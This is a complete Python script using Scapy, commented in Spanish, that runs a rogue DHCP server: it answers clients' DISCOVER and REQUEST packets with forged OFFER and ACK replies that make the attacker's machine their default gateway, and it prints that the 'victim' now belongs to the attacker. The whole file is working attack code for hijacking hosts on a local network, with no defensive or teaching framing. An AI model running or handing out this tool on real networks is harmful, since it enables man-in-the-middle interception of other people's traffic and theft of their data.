#!/usr/bin/env python3
from scapy.all import *
import time

# --- CONFIGURACIÓN ---
interface = "eth0"
my_ip = "10.22.95.4"       # Tu IP (Atacante)
fake_router = "10.22.95.4" # El Gateway serás TÚ
fake_dns = "8.8.8.8"
offer_ip = "10.22.95.200"  # La IP que le daremos a la víctima
subnet_mask = "255.255.255.0"
# ---------------------

print(f"[*] Servidor DHCP ROGUE (Full Handshake) en {interface}...")
print(f"[*] Interceptando peticiones...")

def get_option(dhcp_options, key):
    """Busca una opción específica dentro del paquete DHCP"""
    for item in dhcp_options:
        if item[0] == key:
            return item[1]
    return None

def handle_dhcp(pkt):
    if DHCP in pkt:
        message_type = get_option(pkt[DHCP].options, 'message-type')
        client_mac = pkt[Ether].src
        xid = pkt[BOOTP].xid
        
        # 1. Si es DISCOVER -> Enviamos OFFER
        if message_type == 1:
            print(f"[+] DISCOVER recibido de {client_mac}. Enviando OFFER...")
            
            offer = Ether(src=get_if_hwaddr(interface), dst="ff:ff:ff:ff:ff:ff") / \
                    IP(src=my_ip, dst="255.255.255.255") / \
                    UDP(sport=67, dport=68) / \
                    BOOTP(op=2, yiaddr=offer_ip, siaddr=my_ip, chaddr=pkt[BOOTP].chaddr, xid=xid) / \
                    DHCP(options=[("message-type", "offer"),
                                  ("server_id", my_ip),
                                  ("subnet_mask", subnet_mask),
                                  ("router", fake_router),
                                  ("name_server", fake_dns),
                                  ("lease_time", 3600),
                                  "end"])
            sendp(offer, iface=interface, verbose=0)

        # 2. Si es REQUEST -> Enviamos ACK (La parte que faltaba)
        elif message_type == 3:
            requested_ip = get_option(pkt[DHCP].options, 'requested_addr')
            
            # Solo confirmamos si nos piden la IP que ofrecimos (o si es broadcast genérico)
            if requested_ip == offer_ip or requested_ip is None:
                print(f"[+] REQUEST recibido de {client_mac}. Enviando ACK final...")
                
                ack = Ether(src=get_if_hwaddr(interface), dst="ff:ff:ff:ff:ff:ff") / \
                      IP(src=my_ip, dst="255.255.255.255") / \
                      UDP(sport=67, dport=68) / \
                      BOOTP(op=2, yiaddr=offer_ip, siaddr=my_ip, chaddr=pkt[BOOTP].chaddr, xid=xid) / \
                      DHCP(options=[("message-type", "ack"), # <--- ESTO FALTABA
                                    ("server_id", my_ip),
                                    ("subnet_mask", subnet_mask),
                                    ("router", fake_router),
                                    ("name_server", fake_dns),
                                    ("lease_time", 3600),
                                    "end"])
                sendp(ack, iface=interface, verbose=0)
                print(f"[*] ¡ATAQUE EXITOSO! La víctima {client_mac} es nuestra.")

# Filtramos tráfico UDP puerto 67
sniff(filter="udp and port 67", iface=interface, prn=handle_dhcp)